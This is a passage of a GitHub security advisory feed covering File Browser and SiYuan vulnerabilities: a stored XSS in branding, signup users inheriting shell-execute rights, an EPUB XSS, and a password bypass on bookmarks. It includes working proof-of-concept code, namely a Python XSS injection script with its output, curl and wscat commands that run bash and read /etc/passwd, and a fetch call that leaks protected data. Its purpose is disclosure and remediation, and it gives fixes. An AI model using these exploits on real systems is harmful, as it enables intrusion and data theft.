-<p>No <code>Content-Security-Policy</code> header is set on the SPA entry point, so there is no CSP mitigation.</p>
-<br>
-
-<h3 id="poc">PoC</h3>
-<p>Below is the PoC python script that could be ran on test environment using docker compose:</p>
-<pre><code class="language-yaml">services:
-
-  filebrowser:
-    image: filebrowser/filebrowser:v2.62.1
-    user: 0:0
-    ports:
-      - "80:80"
-</code></pre>
-<p>And running this PoC python script:</p>
-<pre><code class="language-python">import argparse
-import json
-import sys
-import requests
-
-
-BANNER = """
-  Stored XSS via Branding Injection PoC
-  Affected: filebrowser/filebrowser &lt;=v2.62.1
-  Root cause: http/static.go uses text/template (not html/template)
-  Branding fields rendered unescaped into SPA index.html
-"""
-
-XSS_MARKER = "XSS_BRANDING_POC_12345"
-XSS_PAYLOAD = (
-    '&lt;/title&gt;&lt;script&gt;window.' + XSS_MARKER + '=1;'
-    'alert("XSS in File Browser branding")&lt;/script&gt;&lt;title&gt;'
-)
-
-
-def login(base: str, username: str, password: str) -&gt; str:
-    r = requests.post(f"{base}/api/login",
-                      json={"username": username, "password": password},
-                      timeout=10)
-    if r.status_code != 200:
-        print(f"      Login failed: {r.status_code}")
-        sys.exit(1)
-    return r.text.strip('"')
-
-
-def main():
-    sys.stdout.write(BANNER)
-    sys.stdout.flush()
-
-    ap = argparse.ArgumentParser(
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        description="Stored XSS via branding injection PoC",
-        epilog="""examples:
-  %(prog)s -t http://localhost -u admin -p admin
-  %(prog)s -t http://target.com/filebrowser -u admin -p secret
-
-how it works:
-  1. Authenticates as admin to File Browser
-  2. Sets branding.name to a &lt;script&gt; payload via PUT /api/settings
-  3. Fetches the SPA index (unauthenticated) to verify the payload
-     renders unescaped in the HTML &lt;title&gt; tag
-
-root cause:
-  http/static.go renders the SPA index.html using Go's text/template
-  (NOT html/template) with custom delimiters [{[ and ]}].
-  Branding fields like Name are inserted directly into HTML:
-    &lt;title&gt;[{[.Name]}]&lt;/title&gt;
-  No escaping is applied, so HTML/JS in the name breaks out of
-  the &lt;title&gt; tag and executes as script.
-
-impact:
-  Stored XSS affecting ALL visitors (including unauthenticated).
-  An admin (or attacker who compromised admin) can inject persistent
-  JavaScript that steals credentials from every user who visits.""",
-    )
-
-    ap.add_argument("-t", "--target", required=True,
-                    help="Base URL of File Browser (e.g. http://localhost)")
-    ap.add_argument("-u", "--user", required=True,
-                    help="Admin username")
-    ap.add_argument("-p", "--password", required=True,
-                    help="Admin password")
-    if len(sys.argv) == 1:
-        ap.print_help()
-        sys.exit(1)
-    args = ap.parse_args()
-
-    base = args.target.rstrip("/")
-    hdrs = lambda tok: {"X-Auth": tok, "Content-Type": "application/json"}
-
-    print()
-    print("[*] ATTACK BEGINS...")
-    print("====================")
-
-    print(f"\n  [1] Authenticating to {base}")
-    token = login(base, args.user, args.password)
-    print(f"      Logged in as: {args.user}")
-
-    print(f"\n  [2] Injecting XSS payload into branding.name")
-    r = requests.get(f"{base}/api/settings", headers=hdrs(token), timeout=10)
-    if r.status_code != 200:
-        print(f"      Failed: GET /api/settings returned {r.status_code}")
-        print(f"      (requires admin privileges)")
-        sys.exit(1)
-    settings = r.json()
-    settings["branding"]["name"] = XSS_PAYLOAD
-    r = requests.put(f"{base}/api/settings", headers=hdrs(token),
-                     json=settings, timeout=10)
-    if r.status_code != 200:
-        print(f"      Failed: PUT /api/settings returned {r.status_code}")
-        sys.exit(1)
-    print(f"      Payload injected")
-
-    print(f"\n  [3] Verifying XSS renders in unauthenticated SPA")
-    r = requests.get(f"{base}/", timeout=10)
-    html = r.text
-
-    if XSS_MARKER in html:
-        print(f"      XSS payload found in HTML response!")
-        for line in html.split("\n"):
-            if XSS_MARKER in line:
-                print(f"      &gt;&gt;&gt; {line.strip()[:120]}")
-        csp = r.headers.get("Content-Security-Policy", "")
-        if not csp:
-            print(f"      No CSP header — script executes without restriction")
-        confirmed = True
-    else:
-        print(f"      Payload NOT found in HTML")
-        confirmed = False
-
-    print()
-    print("====================")
-
-    if confirmed:
-        print()
-        print("CONFIRMED: text/template renders branding.name without escaping.")
-        print("The &lt;title&gt; tag is broken and arbitrary &lt;script&gt; executes.")
-        print("Every visitor (authenticated or not) receives the payload.")
-        print()
-        print(f"Open {base}/ in a browser to see the alert() popup.")
-    else:
-        print()
-        print("NOT CONFIRMED in this test run.")
-    print()
-
-
-if __name__ == "__main__":
-    main()
-</code></pre>
-<p>And terminal output:</p>
-<pre><code class="language-bash">root@server205:~/sec-filebrowser# python3 poc_branding_xss.py -t http://localhost -u admin -p "jhSR9z9pofv5evlX"
-
-  Stored XSS via Branding Injection PoC
-  Affected: filebrowser/filebrowser &lt;=v2.62.1
-  Root cause: http/static.go uses text/template (not html/template)
-  Branding fields rendered unescaped into SPA index.html
-
-[*] ATTACK BEGINS...
-====================
-
-  [1] Authenticating to http://localhost
-      Logged in as: admin
-
-  [2] Injecting XSS payload into branding.name
-      Payload injected
-
-  [3] Verifying XSS renders in unauthenticated SPA
-      XSS payload found in HTML response!
-      &gt;&gt;&gt; &lt;/title&gt;&lt;script&gt;window.XSS_BRANDING_POC_12345=1;alert("XSS in File Browser branding")&lt;/script&gt;&lt;title&gt;
-      &gt;&gt;&gt; window.FileBrowser = {"AuthMethod":"json","BaseURL":"","CSS":false,"Color":"","DisableExternal":false,"DisableUsedPercen
-      No CSP header — script executes without restriction
-
-====================
-
-CONFIRMED: text/template renders branding.name without escaping.
-The &lt;title&gt; tag is broken and arbitrary &lt;script&gt; executes.
-Every visitor (authenticated or not) receives the payload.
-
-Open http://localhost/ in a browser to see the alert() popup.
-</code></pre>
-<br>
-
-<h3 id="impact">Impact</h3>
-<ul>
-<li>Stored XSS affecting ALL visitors including unauthenticated users</li>
-<li>Persistent backdoor — the payload survives until branding is manually changed</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-xfqj-3vmx-63wv">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-xfqj-3vmx-63wv</a></li>
-<li><a href="https://github.com/advisories/GHSA-xfqj-3vmx-63wv">https://github.com/advisories/GHSA-xfqj-3vmx-63wv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xfqj-3vmx-63wv</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-31T23:45:56.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser's Signup Grants Execution Permissions When Default Permissions Includes Execution]]></title>
-        <id>https://github.com/advisories/GHSA-x8jc-jvqm-pm3f</id>
-        <link href="https://github.com/advisories/GHSA-x8jc-jvqm-pm3f"/>
-        <updated>2026-03-31T23:44:54.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>signupHandler</code> in File Browser applies default user permissions via <code>d.settings.Defaults.Apply(user)</code>, then strips only <code>Admin</code> (commit <code>a63573b</code>). The <code>Execute</code> permission and <code>Commands</code> list from the default user template are <strong>not</strong> stripped. When an administrator has enabled signup, server-side execution, and set <code>Execute=true</code> in the default user template, any unauthenticated user who self-registers inherits shell execution capabilities and can run arbitrary commands on the server.</p>
-<h2 id="details">Details</h2>
-<h3 id="root-cause">Root Cause</h3>
-<p><code>signupHandler</code> at <code>http/auth.go:167–172</code> applies all default permissions before stripping only <code>Admin</code>:</p>
-<pre><code class="language-go">// http/auth.go
-d.settings.Defaults.Apply(user)   // copies ALL permissions from defaults
-
-// Only Admin is stripped — Execute, Commands are still inherited
-user.Perm.Admin = false
-// user.Perm.Execute remains true if set in defaults
-// user.Commands remains populated if set in defaults
-</code></pre>
-<p><code>settings/defaults.go:31–33</code> confirms <code>Apply</code> copies the full permissions struct including Execute and Commands:</p>
-<pre><code class="language-go">func (d *UserDefaults) Apply(u *users.User) {
-    u.Perm = d.Perm          // includes Execute
-    u.Commands = d.Commands  // includes allowed shell commands
-    // ...
-}
-</code></pre>
-<p>The <code>commandsHandler</code> at <code>http/commands.go:63–66</code> checks both the server-wide <code>EnableExec</code> flag and <code>d.user.Perm.Execute</code>:</p>
-<pre><code class="language-go">if !d.server.EnableExec || !d.user.Perm.Execute {
-    // writes "Command not allowed." and returns
-}
-</code></pre>
-<p>The <code>withUser</code> middleware reads <code>d.user</code> from the database at request time (<code>http/auth.go:103</code>), so the persisted <code>Execute=true</code> and <code>Commands</code> values from signup are authoritative. The command allowlist check at <code>commands.go:80</code> passes because the user's <code>Commands</code> list contains the inherited default commands:</p>
-<pre><code class="language-go">if !slices.Contains(d.user.Commands, name) {
-    // writes "Command not allowed." and returns
-}
-</code></pre>
-<h3 id="execution-flow">Execution Flow</h3>
-<ol>
-<li>Admin configures: <code>Signup=true</code>, <code>EnableExec=true</code>, <code>Defaults.Perm.Execute=true</code>, <code>Defaults.Commands=["bash"]</code></li>
-<li>Unauthenticated attacker POSTs to <code>/api/signup</code> → new user created with <code>Execute=true</code>, <code>Commands=["bash"]</code></li>
-<li>Attacker logs in → receives JWT with valid user ID</li>
-<li>Attacker opens WebSocket to <code>/api/command/</code> → <code>withUser</code> fetches user from DB, <code>Execute=true</code> passes check</li>
-<li>Attacker sends <code>bash</code> over WebSocket → <code>exec.Command("bash")</code> is invoked → arbitrary shell execution</li>
-</ol>
-<p>This is a direct consequence of the incomplete fix in commit <code>a63573b</code> (CVE-2026-32760 / GHSA-5gg9-5g7w-hm73), which applied the same rationale ("signup users should not inherit privileged defaults") only to <code>Admin</code>, not to <code>Execute</code> and <code>Commands</code>.</p>
-<h2 id="poc">PoC</h2>
-<pre><code class="language-bash">TARGET="http://localhost:8080"
-
-# Step 1: Self-register (no authentication required)
-curl -s -X POST "$TARGET/api/signup" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"attacker","password":"AttackerP@ss1!"}'
-# Returns: 200 OK
-
-# Step 2: Log in and capture token
-TOKEN=$(curl -s -X POST "$TARGET/api/login" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"attacker","password":"AttackerP@ss1!"}' | tr -d '"')
-
-# Step 3: Inspect inherited permissions (decode JWT payload)
-echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2&gt;/dev/null | python3 -m json.tool
-# Expected output (if defaults have Execute=true, Commands=["bash"]):
-# {
-#   "user": {
-#     "perm": { "execute": true, ... },
-#     "commands": ["bash"],
-#     ...
-#   }
-# }
-
-# Step 4: Execute shell command via WebSocket (requires wscat: npm install -g wscat)
-echo '{"command":"bash -c \"id &amp;&amp; hostname &amp;&amp; cat /etc/passwd | head -3\""}' | \
-  wscat --header "X-Auth: $TOKEN" \
-        --connect "$TARGET/api/command/" \
-        --wait 3
-# Expected: uid=... hostname output followed by /etc/passwd lines
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>On any deployment where an administrator has:</p>
-<ol>
-<li>Enabled public self-registration (<code>signup = true</code>)</li>
-<li>Enabled server-side command execution (<code>enableExec = true</code>)</li>
-<li>Set <code>Execute = true</code> in the default user template</li>
-<li>Populated <code>Commands</code> with one or more shell commands</li>
-</ol>
-<p>An unauthenticated attacker can self-register and immediately gain the ability to run arbitrary shell commands on the server with the privileges of the File Browser process. All files accessible to the process, environment variables (including secrets), and network interfaces are exposed. This is a complete server compromise for processes running as root, and a significant lateral movement vector otherwise.</p>
-<p>The original <code>Admin</code> fix (GHSA-5gg9-5g7w-hm73) demonstrates that the project explicitly recognizes that self-registered users should not inherit privileged defaults. The <code>Execute</code> + <code>Commands</code> omission is an incomplete application of that principle.</p>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Extend the existing Admin stripping in <code>http/auth.go</code> to also clear <code>Execute</code> and <code>Commands</code> for self-registered users:</p>
-<pre><code class="language-go">// http/auth.go — after d.settings.Defaults.Apply(user)
-
-// Users signed up via the signup handler should never become admins, even
-// if that is the default permission.
-user.Perm.Admin = false
-
-// Self-registered users should not inherit execution capabilities from
-// default settings, regardless of what the administrator has configured
-// as the default. Execution rights must be explicitly granted by an admin.
-user.Perm.Execute = false
-user.Commands = []string{}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-x8jc-jvqm-pm3f">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-x8jc-jvqm-pm3f</a></li>
-<li><a href="https://github.com/advisories/GHSA-x8jc-jvqm-pm3f">https://github.com/advisories/GHSA-x8jc-jvqm-pm3f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x8jc-jvqm-pm3f</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-31T23:44:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser is vulnerable to Stored Cross-site Scripting via crafted EPUB file]]></title>
-        <id>https://github.com/advisories/GHSA-5vpr-4fgw-f69h</id>
-        <link href="https://github.com/advisories/GHSA-5vpr-4fgw-f69h"/>
-        <updated>2026-03-31T23:44:38.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The EPUB preview function in File Browser is vulnerable to Stored Cross-site Scripting (XSS). JavaScript embedded in a crafted EPUB file executes in the victim's browser when they preview the file.</p>
-<h3 id="details">Details</h3>
-<p><code>frontend/src/views/files/Preview.vue</code> passes <code>allowScriptedContent: true</code> to the <code>vue-reader</code> (epub.js) component:</p>
-<pre><code class="language-js">// frontend/src/views/files/Preview.vue (Line 87)
-:epubOptions="{
-  allowPopups: true,
-  allowScriptedContent: true,
-}"
-</code></pre>
-<p>epub.js renders EPUB content inside a sandboxed </p>]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5vpr-4fgw-f69h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-31T23:44:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: Unauthenticated Access to Password-Protected Bookmarks via /api/bookmark/getBookmark]]></title>
-        <id>https://github.com/advisories/GHSA-c77m-r996-jr3q</id>
-        <link href="https://github.com/advisories/GHSA-c77m-r996-jr3q"/>
-        <updated>2026-03-31T23:30:05.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The publish service exposes bookmarked blocks from password-protected documents to unauthenticated visitors. In publish/read-only mode, <code>/api/bookmark/getBookmark</code> filters bookmark results by calling <code>FilterBlocksByPublishAccess(nil, ...)</code>. Because the filter treats a <code>nil</code> context as authorized, it skips the publish password check and returns bookmarked blocks from documents configured as <code>Protected</code>. As a result, anyone who can access the publish service can retrieve content from protected documents without providing the required password, as long as at least one block in the document is bookmarked.</p>
-<h3 id="details">Details</h3>
-<p>The issue is caused by an authorization bypass in the bookmark API path used by the publish service.</p>
-<p>In <code>kernel/api/bookmark.go</code>, <code>getBookmark</code> checks whether the current request is in a read-only role and then filters bookmarks for publish access. However, it passes <code>nil</code> as the request context:</p>
-<pre><code class="language-go">if model.IsReadOnlyRoleContext(c) {
-    publishAccess := model.GetPublishAccess()
-    tempBookmarks := &amp;model.Bookmarks{}
-    for _, bookmark := range *bookmarks {
-        bookmark.Blocks = model.FilterBlocksByPublishAccess(nil, publishAccess, bookmark.Blocks)
-</code></pre>
-<p>In <code>kernel/model/publish_access.go</code>, <code>FilterBlocksByPublishAccess</code> allows access when <code>c == nil</code>:</p>
-<pre><code class="language-go">if CheckPathAccessableByPublishIgnore(block.Box, block.Path, publishIgnore) &amp;&amp;
-   (c == nil || password == "" || CheckPublishAuthCookie(c, passwordID, password)) {
-    ret = append(ret, block)
-}
-</code></pre>
-<p>This bypasses the intended password enforcement performed by <code>CheckPublishAuthCookie</code>, which validates the <code>publish-auth-&lt;id&gt;</code> cookie for protected content.</p>
-<p>The publish proxy authenticates anonymous publish visitors with a <code>RoleReader</code> token, and <code>CheckAuth</code> accepts <code>RoleReader</code>, so unauthenticated publish visitors can reach <code>/api/bookmark/getBookmark</code> and trigger the vulnerable code path.</p>
-<p>I reproduced this by creating a protected document, bookmarking a block inside it, opening the publish service in an incognito session without entering the document password, and sending a <code>POST /api/bookmark/getBookmark</code> request. The response returned a bookmark group containing the protected block in <code>data[0].blocks</code>, confirming the bypass.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Start SiYuan with the publish service enabled.</li>
-<li>Create a new document, for example publish-bookmark-poc.</li>
-<li>Add a block containing identifiable content, for example BOOKMARK_SECRET_123.</li>
-<li>Open the block attributes and assign a bookmark label, for example leak-test.</li>
-<li>In Doc Tree, enable Publish Access Control and set the document to Protected.</li>
-<li>Set a password for that document, for example test123, and confirm the change.</li>
-<li>Open the publish service in a fresh incognito/private browser session.</li>
-<li>Verify that opening the protected document through the publish UI requires the password.</li>
-<li>Without entering the password, open the browser developer console and run:</li>
-</ol>
-<pre><code class="language-js">fetch("/api/bookmark/getBookmark", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: "{}"
-})
-  .then(r =&gt; r.json())
-  .then(x =&gt; console.log(JSON.stringify(x, null, 2)));
-</code></pre>
-<ol start="10">
-<li>Observe that the response contains a bookmark entry such as:</li>
-</ol>
-<pre><code class="language-json">{
-  "code": 0,
-  "msg": "",
-  "data": [
-    {
-      "name": "leak-test",
-      "blocks": [
-        {
-          "box": "20260327012540-ppsxc5j",
-          "path": "/20260327012543-acu1mdn.sy",
-          "hPath": "/publish-bookmark-poc",
-          "id": "20260327012543-1y6djn1",
-          "rootID": "20260327012543-acu1mdn",
-          "parentID": "20260327012543-acu1mdn",
-          "name": "",
-          "alias": "",
-          "memo": "",
-          "tag": "",
-          "content": "​&lt;span data-type=\"code\"&gt;​BOOKMARK_SECRET_123&lt;/span&gt;​",
-          "fcontent": "",
-          "markdown": "`BOOKMARK_SECRET_123`",
-          "folded": false,
-          "type": "NodeParagraph",
-          "subType": "",
-          "refText": "",
-          "refs": null,
-          "defID": "",
-          "defPath": "",
-          "ial": {
-            "bookmark": "leak-test",
-            "id": "20260327012543-1y6djn1",
-            "updated": "20260327013116"
-          },
-          "children": null,
-          "depth": 1,
-          "count": 0,
-          "refCount": 0,
-          "sort": 10,
-          "created": "",
-          "updated": "",
-          "riffCardID": "",
-          "riffCard": null
-        }
-      ],
-      "type": "bookmark",
-      "depth": 0,
-      "count": 1
-    }
-  ]
-}
-</code></pre>
-<p>Actual result:
-<code>/api/bookmark/getBookmark</code> returns bookmarked blocks from protected documents without requiring the publish password.</p>
-<h3 id="impact">Impact</h3>
-<p>An unauthenticated attacker who can access the publish service can read bookmarked content from documents configured as password-protected. This breaks the confidentiality guarantee of the <code>Protected</code> publish access level. The impact is limited to blocks that have been bookmarked, but the leakage is direct, requires no user interaction, and does not require knowledge of the document password.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c77m-r996-jr3q">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c77m-r996-jr3q</a></li>
-<li><a href="https://github.com/advisories/GHSA-c77m-r996-jr3q">https://github.com/advisories/GHSA-c77m-r996-jr3q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c77m-r996-jr3q</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-31T23:30:03.000Z</published>
     </entry>
 </feed>
